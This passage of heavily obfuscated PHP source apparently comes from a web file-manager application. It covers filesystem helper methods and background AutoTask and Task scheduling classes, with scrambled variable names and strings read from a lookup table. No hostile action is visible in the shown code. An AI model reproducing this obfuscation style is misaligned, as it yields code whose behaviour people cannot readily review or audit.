$•¢âä©Ä = @rename($½«Ô¼Û·, $ò¨Ş±ÓÁ); $ò¨Ş±ÓÁ = $this->iconvApp($ò¨Ş±ÓÁ); return $•¢âä©Ä ? $this->getPathOuter($ò¨Ş±ÓÁ) : !1; } public function size($‰ü…’åÙ) { $‰ü…’åÙ = $this->iconvSystem($‰ü…’åÙ); return filesize_64($‰ü…’åÙ); } public function info($ØİÀ†) { $ØİÀ† = $this->iconvSystem($ØİÀ†); if ($this->isFolder($ØİÀ†)) { return $this->folderInfo($ØİÀ†); } else { if ($this->isFile($ØİÀ†)) { return $this->fileInfo($ØİÀ†); } } return !1; } protected function infoChildren($³õú÷’, &$÷ù’Â —, $ÜîÌ•ÒË = true) { $‚ß¸Ô¯á =& $_SERVER[ Ö‘ñÄ”]; check_abort_echo(); $³õú÷’ = rtrim($³õú÷’, $‚ß¸Ô¯á[8]) . $‚ß¸Ô¯á[8]; if ($ÜîÌ•ÒË) { $³õú÷’ = $this->iconvSystem($³õú÷’); } if (!($¬à–’ÏÛ = @opendir($³õú÷’))) { return; } while (($ĞØò´Æà = readdir($¬à–’ÏÛ)) !== !1) { if ($ĞØò´Æà == $‚ß¸Ô¯á[10] || $ĞØò´Æà == $‚ß¸Ô¯á[1380]) { continue; } $ƒäŞÈ«ş = $³õú÷’ . $ĞØò´Æà; if (is_file($ƒäŞÈ«ş) || is_link($ƒäŞÈ«ş)) { $÷ù’Â —[$‚ß¸Ô¯á[77]]++; $÷ù’Â —[$‚ß¸Ô¯á[76]] += filesize_64($ƒäŞÈ«ş); } else { if (is_dir($ƒäŞÈ«ş)) { $÷ù’Â —[$‚ß¸Ô¯á[78]]++; $this->infoChildren($ƒäŞÈ«ş, $÷ù’Â —, !1); } } } closedir($¬à–’ÏÛ); } private function folderInfo($¡šóÓÉ, $Í÷¹Ù×Û = false) { $ÓÅ¾÷ƒ¯ =& $_SERVER[ Ö‘ñÄ”]; $¡šóÓÉ = rtrim($¡šóÓÉ, $ÓÅ¾÷ƒ¯[8]) . $ÓÅ¾÷ƒ¯[8]; $âè”ñ·Ó = $this->iconvApp($this->pathThis($¡šóÓÉ)); if ($Í÷¹Ù×Û) { return array($ÓÅ¾÷ƒ¯[32] => $âè”ñ·Ó, $ÓÅ¾÷ƒ¯[84] => $this->getPathOuter($¡šóÓÉ), $ÓÅ¾÷ƒ¯[33] => $ÓÅ¾÷ƒ¯[75]); } $ù‘ğ¿¹½ = array($ÓÅ¾÷ƒ¯[32] => $âè”ñ·Ó, $ÓÅ¾÷ƒ¯[84] => $this->getPathOuter($¡šóÓÉ), $ÓÅ¾÷ƒ¯[33] => $ÓÅ¾÷ƒ¯[75], $ÓÅ¾÷ƒ¯[200] => @filectime($¡šóÓÉ), $ÓÅ¾÷ƒ¯[85] => @filemtime($¡šóÓÉ), $ÓÅ¾÷ƒ¯[1383] => @fileatime($¡šóÓÉ), $ÓÅ¾÷ƒ¯[1384] => is_readable($¡šóÓÉ), $ÓÅ¾÷ƒ¯[1385] => is_writable($¡šóÓÉ), $ÓÅ¾÷ƒ¯[1386] => get_mode($¡šóÓÉ)); return $ù‘ğ¿¹½; } private function fileInfo($è±îßĞ¶, $•—¢Í®ğ = false) { $Ì›À Ï¯ =& $_SERVER[ Ö‘ñÄ”]; $î¨‚„ôÆ = $this->iconvApp($this->pathThis($è±îßĞ¶)); if ($•—¢Í®ğ) { return array($Ì›À Ï¯[32] => $î¨‚„ôÆ, $Ì›À Ï¯[84] => $this->getPathOuter($è±îßĞ¶), $Ì›À Ï¯[33] => $Ì›À Ï¯[199], $Ì›À Ï¯[76] => $this->size($è±îßĞ¶), $Ì›À Ï¯[174] => $this->ext($î¨‚„ôÆ)); } $ş¯áíÒÉ = array($Ì›À Ï¯[32] => $î¨‚„ôÆ, $Ì›À Ï¯[84] => $this->getPathOuter($è±îßĞ¶), $Ì›À Ï¯[33] => $Ì›À Ï¯[199], $Ì›À Ï¯[200] => @filectime($è±îßĞ¶), $Ì›À Ï¯[85] => @filemtime($è±îßĞ¶), $Ì›À Ï¯[1383] => @fileatime($è±îßĞ¶), $Ì›À Ï¯[76] => $this->size($è±îßĞ¶), $Ì›À Ï¯[174] => $this->ext($î¨‚„ôÆ), $Ì›À Ï¯[1384] => is_readable($è±îßĞ¶), $Ì›À Ï¯[1385] => is_writable($è±îßĞ¶), $Ì›À Ï¯[1386] => get_mode($è±îßĞ¶)); return $ş¯áíÒÉ; } public function exist($Ä¿ÑÌ) { $Ä¿ÑÌ = $this->iconvSystem($Ä¿ÑÌ); return @file_exists($Ä¿ÑÌ); } public function isFile($ İå”¶¥) { $ İå”¶¥ = $this->iconvSystem($ İå”¶¥); return @is_file($ İå”¶¥); } public function isFolder($ï×˜´³«) { $ï×˜´³« = $this->iconvSystem($ï×˜´³«); return @is_dir($ï×˜´³«); } public function listPath($»•ğÒŞ®, $ÓŒÒª› = false) { $êëËÙ÷ =& $_SERVER[ Ö‘ñÄ”]; $»•ğÒŞ® = $this->iconvSystem($»•ğÒŞ®); $»•ğÒŞ® = rtrim($»•ğÒŞ®, $êëËÙ÷[8]) . $êëËÙ÷[8]; $¸¦¤Ïûì = array($êëËÙ÷[82] => array(), $êëËÙ÷[83] => array()); if (!($ã†«¸çÇ = @opendir($»•ğÒŞ®))) { return $¸¦¤Ïûì; } while (($‡«È‰îœ = readdir($ã†«¸çÇ)) !== !1) { if ($‡«È‰îœ == $êëËÙ÷[10] || $‡«È‰îœ == $êëËÙ÷[1380]) { continue; } $ñêâÊÑÔ = $»•ğÒŞ® . $‡«È‰îœ; if (is_file($ñêâÊÑÔ)) { $¸¦¤Ïûì[$êëËÙ÷[83]][] = $this->fileInfo($ñêâÊÑÔ, $ÓŒÒª›); } else { $¸¦¤Ïûì[$êëËÙ÷[82]][] = $this->folderInfo($ñêâÊÑÔ, $ÓŒÒª›); } } closedir($ã†«¸çÇ); return $¸¦¤Ïûì; } public function listAll($ÔñÑŒÃô, &$±å¡ê¶• = array()) { $Â¶şåë =& $_SERVER[ Ö‘ñÄ”]; $ÔñÑŒÃô = $this->iconvSystem($ÔñÑŒÃô); $ÔñÑŒÃô = rtrim($ÔñÑŒÃô, $Â¶şåë[8]) . $Â¶şåë[8]; if (!($ÛäôêÅ¼ = @opendir($ÔñÑŒÃô))) { return $±å¡ê¶•; } while (($ç§ÁØ­î = readdir($ÛäôêÅ¼)) !== !1) { if ($ç§ÁØ­î == $Â¶şåë[10] || $ç§ÁØ­î == $Â¶şåë[1380]) { continue; } $•©ƒ©™ø = $ÔñÑŒÃô . $ç§ÁØ­î; if (is_dir($•©ƒ©™ø) && !is_link($•©ƒ©™ø)) { $±å¡ê¶•[] = array($Â¶şåë[84] => $•©ƒ©™ø . $Â¶şåë[8], $Â¶şåë[75] => 1, $Â¶şåë[85] => @filemtime($•©ƒ©™ø), $Â¶şåë[76] => 0); $this->listAll($•©ƒ©™ø, $±å¡ê¶•); } else { $±å¡ê¶•[] = array($Â¶şåë[84] => $•©ƒ©™ø, $Â¶şåë[75] => 0, $Â¶şåë[85] => @filemtime($•©ƒ©™ø), $Â¶şåë[76] => $this->size($•©ƒ©™ø)); } } closedir($ÛäôêÅ¼); return $±å¡ê¶•; } public function has($œ”ïËü±, $ñî“ì¢À = false, $»óÃßò = true) { $¬™éÜõİ =& $_SERVER[ Ö‘ñÄ”]; $œ”ïËü± = $this->iconvSystem($œ”ïËü±); $œ”ïËü± = rtrim($œ”ïËü±, $¬™éÜõİ[8]) . $¬™éÜõİ[8]; if (!($ÇÔÕıá× = @opendir($œ”ïËü±))) { return !1; } $ä³ŞÛå = 0; $˜È­‘®† = 0; $ˆûıƒŠÙ = 0; while (($œ‹üÑ = readdir($ÇÔÕıá×)) !== !1) { if ($œ‹üÑ == $¬™éÜõİ[10] || $œ‹üÑ == $¬™éÜõİ[1380]) { continue; } $¬—›ØÓö = $œ”ïËü± . $œ‹üÑ; if ($ñî“ì¢À) { $ˆûıƒŠÙ++; if (@is_file($¬—›ØÓö)) { $ä³ŞÛå++; } else { $˜È­‘®†++; } if ($ˆûıƒŠÙ > 10000) { break; } continue; } if ($»óÃßò) { if (@is_file($¬—›ØÓö)) { return !0; } } else { if (@is_dir($¬—›ØÓö . $¬™éÜõİ[8])) { return !0; } } } closedir($ÇÔÕıá×); if ($ñî“ì¢À) { return array($¬™éÜõİ[207] => $ä³ŞÛå, $¬™éÜõİ[208] => $˜È­‘®†); } return !1; } public function hashSimple($åå³½½) { $¼ñíÁïˆ =& $_SERVER[ Ö‘ñÄ”]; if (!$åå³½½) { return md5($¼ñíÁïˆ[12]); } $åå³½½ = $this->iconvSystem($åå³½½); $í…‚É­Î = $this->size($åå³½½); $Ì¹Î„£ = 200; $ù«ÄêÍÄ = 50; if ($í…‚É­Î <= $Ì¹Î„£ * $ù«ÄêÍÄ) { return $this->hashMd5($åå³½½) . $í…‚É­Î; } $›ƒÏ×Š½ = $¼ñíÁïˆ[12]; $ş™Ãı×° = intval($í…‚É­Î / $ù«ÄêÍÄ); $­Ø“’Å¬ = fopen($åå³½½, $¼ñíÁïˆ[1387]); if (!$­Ø“’Å¬) { return $›ƒÏ×Š½; } for ($”şÁ·ëƒ = 0; $”şÁ·ëƒ < $ù«ÄêÍÄ; $”şÁ·ëƒ++) { fseek_64($­Ø“’Å¬, $ş™Ãı×° * $”şÁ·ëƒ); $›ƒÏ×Š½ .= fread($­Ø“’Å¬, $Ì¹Î„£); } fseek_64($­Ø“’Å¬, $í…‚É­Î - $Ì¹Î„£); $›ƒÏ×Š½ .= fread($­Ø“’Å¬, $Ì¹Î„£); fclose($­Ø“’Å¬); return md5($›ƒÏ×Š½) . $í…‚É­Î; } public function getContent($€Õ²«Õù) { $€Õ²«Õù = $this->iconvSystem($€Õ²«Õù); return file_get_contents($€Õ²«Õù); } public function setContent($ª‡£ôº‰, $ãÆ“ÈÎ = '') { $ª‡£ôº‰ = $this->iconvSystem($ª‡£ôº‰); $»Â–…Ì = @file_put_contents($ª‡£ôº‰, $ãÆ“ÈÎ, LOCK_EX); clearstatcache(); @chmod($ª‡£ôº‰, $this->pathAuth); return $»Â–…Ì === !1 ? !1 : !0; } public function fileSubstr($Ñß±ÂÍ, $§ôàÅ² = 0, $¾–·…®Ì = false) { $‚â¬š€ =& $_SERVER[ Ö‘ñÄ”]; $Ñß±ÂÍ = $this->iconvSystem($Ñß±ÂÍ); if ($¾–·…®Ì === !1) { $¾–·…®Ì = $this->size($Ñß±ÂÍ); } if ($¾–·…®Ì <= 0) { return $‚â¬š€[12]; } $˜äˆ÷Ø = fopen($Ñß±ÂÍ, $‚â¬š€[1387]); if (!$˜äˆ÷Ø) { return !1; } fseek_64($˜äˆ÷Ø, $§ôàÅ²); $“ Ş®ÓÓ = fread($˜äˆ÷Ø, $¾–·…®Ì); fclose($˜äˆ÷Ø); return $“ Ş®ÓÓ; } public function upload($ „÷‚ğ¾, $õÃšÜ¹, $ªü¡ã© = false, $—‘Ùõø = REPEAT_REPLACE) { if ($ªü¡ã©) { return $this->moveFile($õÃšÜ¹, $ „÷‚ğ¾); } return $this->copyFile($õÃšÜ¹, $ „÷‚ğ¾); } public function setModifyTime($ÏĞ§•íó, $ØË¸Ûêİ = '') { @touch($ÏĞ§•íó, intval($ØË¸Ûêİ)); } public function download($¶ı´˜ßï, $Ì¬ôš©) { return $this->iconvSystem($¶ı´˜ßï); } } goto F‚áÖ—Ê³–; bââ„ä®Çˆ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $°ÖÂÃ‘÷ =& $_SERVER[ Ö‘ñÄ”]; if (self::valueGet($°ÖÂÃ‘÷[763]) != $°ÖÂÃ‘÷[88]) { return; } if (self::valueGet($°ÖÂÃ‘÷[1622]) == $°ÖÂÃ‘÷[88]) { $óºñ†ŒÍ = self::valueGet($°ÖÂÃ‘÷[1623]); if (time() - $óºñ†ŒÍ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$°ÖÂÃ‘÷[1624]] = 1; self::valueSet($°ÖÂÃ‘÷[1622], $°ÖÂÃ‘÷[88]); self::log($°ÖÂÃ‘÷[1625] . ACTION . $°ÖÂÃ‘÷[1626]); Session::$data = array(); Session::$sessionSign = $°ÖÂÃ‘÷[12]; $GLOBALS[$°ÖÂÃ‘÷[511]] = 1; Hook::bind($°ÖÂÃ‘÷[1627], $°ÖÂÃ‘÷[1628]); $¶Ï·ö×­ = 0; while (!0) { self::cacheClear(); if (self::valueGet($°ÖÂÃ‘÷[763]) != $°ÖÂÃ‘÷[88]) { self::valueSet($°ÖÂÃ‘÷[1622], $°ÖÂÃ‘÷[197]); self::log($°ÖÂÃ‘÷[1629]); die; } $ŠÄ¬«ƒ÷ = time(); if ($ŠÄ¬«ƒ÷ - $¶Ï·ö×­ >= 60) { self::valueSet(array($°ÖÂÃ‘÷[1622] => $°ÖÂÃ‘÷[88], $°ÖÂÃ‘÷[1623] => $ŠÄ¬«ƒ÷), !1); $¶Ï·ö×­ = $ŠÄ¬«ƒ÷; } if (!file_exists(USER_SYSTEM . $°ÖÂÃ‘÷[1630])) { self::valueSet(array($°ÖÂÃ‘÷[1622] => $°ÖÂÃ‘÷[197], $°ÖÂÃ‘÷[763] => $°ÖÂÃ‘÷[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $³¥«éò— =& $_SERVER[ Ö‘ñÄ”]; http_close(); self::valueSet($³¥«éò—[763], $³¥«éò—[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($³¥«éò—[1622] => $³¥«éò—[197], $³¥«éò—[763] => $³¥«éò—[88]), !1); } public static function taskSwitch() { $´Çôğù =& $_SERVER[ Ö‘ñÄ”]; $Ò«º¢ñı = self::valueGet($´Çôğù[763]) == $´Çôğù[88] ? $´Çôğù[197] : $´Çôğù[88]; self::valueSet($´Çôğù[763], $Ò«º¢ñı); } public static function shutdownEvent() { $£ÂøÍº¿ =& $_SERVER[ Ö‘ñÄ”]; self::valueSet($£ÂøÍº¿[1622], $£ÂøÍº¿[197]); self::log($£ÂøÍº¿[1631]); } public static function config($˜ıÒ», $ë¢…¯ìÙ) { self::valueSet($_SERVER[ Ö‘ñÄ”][763], $˜ıÒ»); } private static function taskRunAll() { $Ğà«¬òô =& $_SERVER[ Ö‘ñÄ”]; $şøÙ„Ñ‹ = timeFloat(); $ÓòÍ¬Ì£ = Model($Ğà«¬òô[1632])->listData(); $œÛÁñ×Œ = count($ÓòÍ¬Ì£); for ($°õõ£ß“ = 0; $°õõ£ß“ < $œÛÁñ×Œ; $°õõ£ß“++) { $Ò’ùÂÖ = $ÓòÍ¬Ì£[$°õõ£ß“]; if (!$Ò’ùÂÖ[$Ğà«¬òô[407]] || $Ò’ùÂÖ[$Ğà«¬òô[1633]] != $Ğà«¬òô[88]) { continue; } if (!self::taskTimeCheck($Ò’ùÂÖ)) { continue; } self::taskRun($Ò’ùÂÖ); } Hook::trigger($Ğà«¬òô[1634]); self::taskQueueRun($şøÙ„Ñ‹); } private static function taskQueueRun($€úœÑËµ) { $éÛŞÀ±¼ = 10; while (!0) { $÷€ûÖ¢· = TaskQueue::run(); if ($÷€ûÖ¢· === !1) { break; } if (timeFloat() - $€úœÑËµ >= $éÛŞÀ±¼) { break; } } } private static function taskTimeCheck($¹Åçú) { $å–‚ø’æ =& $_SERVER[ Ö‘ñÄ”]; $—öùØô” = json_decode($¹Åçú[$å–‚ø’æ[203]], !0); $¹Å•¼¥í = intval($¹Åçú[$å–‚ø’æ[1623]]); $óÓÊÖ¦ë = strtotime($å–‚ø’æ[1635] . $—öùØô”[$å–‚ø’æ[1636]] . $å–‚ø’æ[1637]) - strtotime($å–‚ø’æ[1638]); $âéïõõ€ = time() - strtotime(date($å–‚ø’æ[1639]) . $å–‚ø’æ[1640]); $Ü°ª¼ = $âéïõõ€ >= $óÓÊÖ¦ë && $âéïõõ€ <= $óÓÊÖ¦ë + 3600; switch ($—öùØô”[$å–‚ø’æ[33]]) { case $å–‚ø’æ[1641]: if (time() - $¹Å•¼¥í < 3600 * 24 * 30) { return !1; } if ($—öùØô”[$å–‚ø’æ[1641]] == date($å–‚ø’æ[1642]) && $Ü°ª¼) { return !0; } break; case $å–‚ø’æ[1643]: if (time() - $¹Å•¼¥í < 3600 * 24 * 7) { return !1; } $è­âãöı = date($å–‚ø’æ[1644]) == 0 ? 7 : date($å–‚ø’æ[1644]); if ($—öùØô”[$å–‚ø’æ[1643]] == $è­âãöı && $Ü°ª¼) { return !0; } break; case $å–‚ø’æ[1636]: if (time() - $¹Å•¼¥í < 3600 * 24) { return !1; } if ($Ü°ª¼) { return !0; } break; case $å–‚ø’æ[1645]: if (time() - $¹Å•¼¥í >= floatval($—öùØô”[$å–‚ø’æ[1645]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $œë¾ì¦ê =& $_SERVER[ Ö‘ñÄ”]; static $™ô«Úêò = 0; $Ãğº¼€ = 300; if (!$™ô«Úêò) { $™ô«Úêò = time(); } if (time() - $™ô«Úêò < $Ãğº¼€) { return; } $™ô«Úêò = time(); $Ìú¶½Æ = Model($œë¾ì¦ê[521])->db($œë¾ì¦ê[12]); if ($Ìú¶½Æ) { $Ìú¶½Æ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($œë¾ì¦ê[1646], $œë¾ì¦ê[1647]); die; } } public static function taskRun($ÅÓÔÆ) { $™°ğöş“ =& $_SERVER[ Ö‘ñÄ”]; self::log($™°ğöş“[1648] . $ÅÓÔÆ[$™°ğöş“[407]] . $™°ğöş“[1649] . $ÅÓÔÆ[$™°ğöş“[32]] . $™°ğöş“[1650] . $ÅÓÔÆ[$™°ğöş“[1651]]); Model($™°ğöş“[1632])->run($ÅÓÔÆ[$™°ğöş“[407]]); $µ™ò‘ŠĞ = timeFloat(); $äïÌÑóÚ = $™°ğöş“[12]; switch ($ÅÓÔÆ[$™°ğöş“[33]]) { case $™°ğöş“[316]: $£â©‘¡ = url_request($ÅÓÔÆ[$™°ğöş“[1651]], $™°ğöş“[230], !1, !1, !1, !1, 10); if ($£â©‘¡[$™°ğöş“[763]]) { $äïÌÑóÚ = strlen($£â©‘¡[$™°ğöş“[1199]]); } break; case $™°ğöş“[229]: $äïÌÑóÚ = Hook::apply($ÅÓÔÆ[$™°ğöş“[1651]]); default: break; } Model($™°ğöş“[1652])->add(array($™°ğöş“[1653] => $™°ğöş“[12], $™°ğöş“[1654] => $™°ğöş“[197], $™°ğöş“[33] => $™°ğöş“[1655] . $ÅÓÔÆ[$™°ğöş“[407]], $™°ğöş“[1656] => json_encode(array($™°ğöş“[32] => $ÅÓÔÆ[$™°ğöş“[32]], $™°ğöş“[1657] => timeFloat() - $µ™ò‘ŠĞ, $™°ğöş“[302] => $äïÌÑóÚ)))); $ùŞßÊŞÚ = $äïÌÑóÚ ? $™°ğöş“[1658] . $äïÌÑóÚ : $™°ğöş“[12]; self::log($™°ğöş“[1659] . $ÅÓÔÆ[$™°ğöş“[407]] . $™°ğöş“[164] . $ùŞßÊŞÚ); return !0; } private static function valueGet($ŠÌ³ŞŞÅ) { $—Õ¥É°× =& $_SERVER[ Ö‘ñÄ”]; $Ğ—ÊÉø’ = $—Õ¥É°×[1660]; $ä½˜ÔƒÎ = Model($—Õ¥É°×[443])->get($ŠÌ³ŞŞÅ, $Ğ—ÊÉø’); if (is_null($ä½˜ÔƒÎ)) { Model($—Õ¥É°×[443])->set($—Õ¥É°×[763], $—Õ¥É°×[88], $Ğ—ÊÉø’); Model($—Õ¥É°×[443])->set($—Õ¥É°×[1622], $—Õ¥É°×[197], $Ğ—ÊÉø’); $ä½˜ÔƒÎ = Model($—Õ¥É°×[443])->get($ŠÌ³ŞŞÅ, $Ğ—ÊÉø’); } return $ä½˜ÔƒÎ; } private static function valueSet($Ú•İ°­“, $õş’½¼•) { $‘íÍšË‡ =& $_SERVER[ Ö‘ñÄ”]; $ÚÒåßôØ = $‘íÍšË‡[1661]; CacheLock::lock($ÚÒåßôØ); $‰©•ôğ = Model($‘íÍšË‡[443])->set($Ú•İ°­“, $õş’½¼•, $‘íÍšË‡[1660]); CacheLock::unlock($ÚÒåßôØ); return $‰©•ôğ; } protected static function log($Ğ¼ÂÏü) { write_log($Ğ¼ÂÏü, $_SERVER[ Ö‘ñÄ”][1647]); } private static function cacheClear() { $»ûìÈ€È =& $_SERVER[ Ö‘ñÄ”]; Cache::clearMemory(Model($»ûìÈ€È[443])->cacheKey($»ûìÈ€È[1660])); Cache::clearMemory(Model($»ûìÈ€È[443])->cacheKey($»ûìÈ€È[1662])); Model($»ûìÈ€È[1632])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\162\165\156\156\151\156\x67"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($²èéçã«, $Åê¯£œé = '', $‰ãı¸ = 0, $¨”„ö§¥ = '') { $ÄÖå¢€ =& $_SERVER[ Ö‘ñÄ”]; if (self::get($²èéçã«)) { return; } $this->task = array($ÄÖå¢€[407] => $²èéçã«, $ÄÖå¢€[1663] => USER_ID, $ÄÖå¢€[1562] => $¨”„ö§¥, $ÄÖå¢€[33] => $Åê¯£œé, $ÄÖå¢€[1070] => $ÄÖå¢€[12], $ÄÖå¢€[799] => $‰ãı¸, $ÄÖå¢€[1664] => 0, $ÄÖå¢€[1665] => 0, $ÄÖå¢€[1666] => 0, $ÄÖå¢€[1667] => timeFloat(), $ÄÖå¢€[1668] => 0, $ÄÖå¢€[1669] => 0, $ÄÖå¢€[1670] => 0, $ÄÖå¢€[1671] => 0, $ÄÖå¢€[763] => $ÄÖå¢€[1622]); $GLOBALS[$ÄÖå¢€[1672]] = 1; Hook::bind($ÄÖå¢€[1627], array($this, $ÄÖå¢€[1673])); Hook::bind($ÄÖå¢€[1674], array($this, $ÄÖå¢€[1675])); $this->startAfter(); Hook::trigger($ÄÖå¢€[1676], $this->task); $this->task[$ÄÖå¢€[1669]] = timeFloat(); } public function end() { $Î”ÑÆº =& $_SERVER[ Ö‘ñÄ”]; if (!$this->task) { return; } if ($this->task[$Î”ÑÆº[1669]]) { self::valueSet($this->task[$Î”ÑÆº[407]], !1); } $£ı®Àù¾ = timeFloat() - $this->task[$Î”ÑÆº[1667]]; self::log($Î”ÑÆº[1677] . $this->task[$Î”ÑÆº[407]] . $Î”ÑÆº[1678] . $£ı®Àù¾ . $Î”ÑÆº[1679]); Hook::unbind($Î”ÑÆº[1627], array($this, $Î”ÑÆº[1673])); Hook::unbind($Î”ÑÆº[1674], array($this, $Î”ÑÆº[1675])); $this->endAfter(); $this->task = !1; } public function update($¤Ëè–ç = 0, $³•Öâ¹£ = false) { $ÄÒµì± =& $_SERVER[ Ö‘ñÄ”]; $Åˆúª“ =& $this->task; if (!$Åˆúª“) { return; } $Åˆúª“[$ÄÒµì±[1664]] += $¤Ëè–ç; $Åˆúª“[$ÄÒµì±[1668]] = timeFloat(); if ($Åˆúª“[$ÄÒµì±[799]]) { if ($Åˆúª“[$ÄÒµì±[799]] < $Åˆúª“[$ÄÒµì±[1664]]) { $Åˆúª“[$ÄÒµì±[799]] = $Åˆúª“[$ÄÒµì±[1664]]; } $éë·¡³ş = timeFloat() - $Åˆúª“[$ÄÒµì±[1667]] - $Åˆúª“[$ÄÒµì±[1670]]; if ($éë·¡³ş <= 0) { $éë·¡³ş = 0.001; } $Åˆúª“[$ÄÒµì±[1665]] = $Åˆúª“[$ÄÒµì±[1664]] / $Åˆúª“[$ÄÒµì±[799]]; $Åˆúª“[$ÄÒµì±[1666]] = $Åˆúª“[$ÄÒµì±[1664]] / $éë·¡³ş; if ($Åˆúª“[$ÄÒµì±[1665]] > 0) { $Åˆúª“[$ÄÒµì±[1671]] = $éë·¡³ş * (1 - $Åˆúª“[$ÄÒµì±[1665]]) / $Åˆúª“[$ÄÒµì±[1665]]; } $Åˆúª“[$ÄÒµì±[1671]] = $Åˆúª“[$ÄÒµì±[1671]] <= 0 ? 0 : $Åˆúª“[$ÄÒµì±[1671]]; } $this->updateAfter(); $ä™Â²¶Ä = 0.2; if (timeFloat() - $Åˆúª“[$ÄÒµì±[1669]] < $ä™Â²¶Ä && !$³•Öâ¹£) { return; } $ÇÃ°ú˜• = self::get($Åˆúª“[$ÄÒµì±[407]]); $É¿‹À¼‰ = $ÇÃ°ú˜•[$ÄÒµì±[763]]; if ($É¿‹À¼‰ == self::STATYS_KILL) { $¸ºò´É = array($ÄÒµì±[1680] => LNG($ÄÒµì±[1681]), $ÄÒµì±[1197] => !1); Cache::set($ÄÒµì±[1682] . $this->task[$ÄÒµì±[407]], $¸ºò´É, 30); $this->onKill(); $this->end(); die; } else { if ($É¿‹À¼‰ == self::STATYS_STOP) { $êØ¾Şªã = 2; $ÇÃ°ú˜•[$ÄÒµì±[1670]] += $êØ¾Şªã; self::valueSet($Åˆúª“[$ÄÒµì±[407]], $ÇÃ°ú˜•); sleep($êØ¾Şªã); $this->update(); return; } } $Åˆúª“[$ÄÒµì±[763]] = $É¿‹À¼‰ ? $É¿‹À¼‰ : $Åˆúª“[$ÄÒµì±[763]]; $Åˆúª“[$ÄÒµì±[1670]] = $ÇÃ°ú˜•[$ÄÒµì±[1670]] ? $ÇÃ°ú˜•[$ÄÒµì±[1670]] : 0; $Åˆúª“[$ÄÒµì±[1669]] = timeFloat(); Hook::trigger($ÄÒµì±[1683], $Åˆúª“); self::valueSet($Åˆúª“[$ÄÒµì±[407]], $Åˆúª“); } public function onKillSet($ìïÖ„ıò, $€Íƒä½µ = array()) { $this->onKillCall = array($ìïÖ„ıò, $€Íƒä½µ); } public function onKill() { $ä­í±º =& $_SERVER[ Ö‘ñÄ”]; self::log($ä­í±º[1677] . $this->task[$ä­í±º[407]] . $ä­í±º[1684]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($•èµÖ”) { $ìËô’¸Â =& $_SERVER[ Ö‘ñÄ”]; Cache::set($ìËô’¸Â[1682] . $this->task[$ìËô’¸Â[407]], $•èµÖ”, 60); return $•èµÖ”; } public static function get($›°ó£üŠ) { $Ò¢Úå¬ğ =& $_SERVER[ Ö‘ñÄ”]; $ÌÂª¥Ø™ = self::valueGet($›°ó£üŠ); if (is_array($ÌÂª¥Ø™) && $ÌÂª¥Ø™[$Ò¢Úå¬ğ[1685]]) { $®Ï®ïğ» = ActionApply($ÌÂª¥Ø™[$Ò¢Úå¬ğ[1685]], array($ÌÂª¥Ø™)); $ÌÂª¥Ø™ = is_array($®Ï®ïğ») ? $®Ï®ïğ» : $ÌÂª¥Ø™; } return $ÌÂª¥Ø™; } public static function listData() { $›Ü²ïƒ = self::valueGet(); return array_sort_by($›Ü²ïƒ, $_SERVER[ Ö‘ñÄ”][1667], !0); } public static function kill($áª‘ëõ”) { return self::changeStatus($áª‘ëõ”, self::STATYS_KILL); } public static function stop($›·­–¤¦) { return self::changeStatus($›·­–¤¦, self::STATYS_STOP); } public static function restart($ÖÀÈ¶Ğå) { return self::changeStatus($ÖÀÈ¶Ğå, self::STATYS_RUNNING); } public static function killAll() { $ÔèŒ£ßÏ =& $_SERVER[ Ö‘ñÄ”]; $´Âë¹»ó = self::listData(); foreach ($´Âë¹»ó as $†¶—º¥à) { self::kill($†¶—º¥à[$ÔèŒ£ßÏ[407]]); } sleep(2); foreach ($´Âë¹»ó as $†¶—º¥à) { self::valueSet($†¶—º¥à[$ÔèŒ£ßÏ[407]], !1); } } private static function changeStatus($ üÚ˜®, $ÔñçÈŸ) { $÷ÙƒÖç¶ =& $_SERVER[ Ö‘ñÄ”]; $ªû¯Ëß§ = self::valueGet($ üÚ˜®); if (!$ªû¯Ëß§) { return !1; } $ªû¯Ëß§[$÷ÙƒÖç¶[763]] = $ÔñçÈŸ; self::valueSet($ üÚ˜®, $ªû¯Ëß§); self::log($÷ÙƒÖç¶[1686] . $ªû¯Ëß§[$÷ÙƒÖç¶[407]] . $÷ÙƒÖç¶[1687] . $ÔñçÈŸ); return !0; } public static function valueGet($ôÎñ¤öµ = false) { $êš¹©¤£ =& $_SERVER[ Ö‘ñÄ”]; if ($ôÎñ¤öµ) { $ÊèÆ½Ç€ = Model($êš¹©¤£[455])->where(array($êš¹©¤£[94] => $ôÎñ¤öµ, $êš¹©¤£[33] => $êš¹©¤£[1077]))->find(); return $ÊèÆ½Ç€ ? json_decode($ÊèÆ½Ç€[$êš¹©¤£[383]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ãğå—† = false) { $²ı½òäß =& $_SERVER[ Ö‘ñÄ”]; $®—ÌÑØ¼ = array($²ı½òäß[33] => $²ı½òäß[1077]); if ($ãğå—†) { $®—ÌÑØ¼[$²ı½òäß[1663]] = $ãğå—†; } $üùÈüäº = Model($²ı½òäß[455])->where($®—ÌÑØ¼)->select(); $üùÈüäº = $üùÈüäº ? $üùÈüäº : array(); foreach ($üùÈüäº as $—¦àßè¿ => $‰£¡Ÿé) { $üùÈüäº[$—¦àßè¿] = json_decode($‰£¡Ÿé[$²ı½òäß[383]], !0); } return $üùÈüäº; } public static function valueSet($Ï«„Ì¤Ÿ, $ù·ëÎÉ) { $ÅíÃÇ¬¤ =& $_SERVER[ Ö‘ñÄ”]; if (!$ù·ëÎÉ) { return Model($ÅíÃÇ¬¤[455])->where(array($ÅíÃÇ¬¤[94] => $Ï«„Ì¤Ÿ, $ÅíÃÇ¬¤[33] => 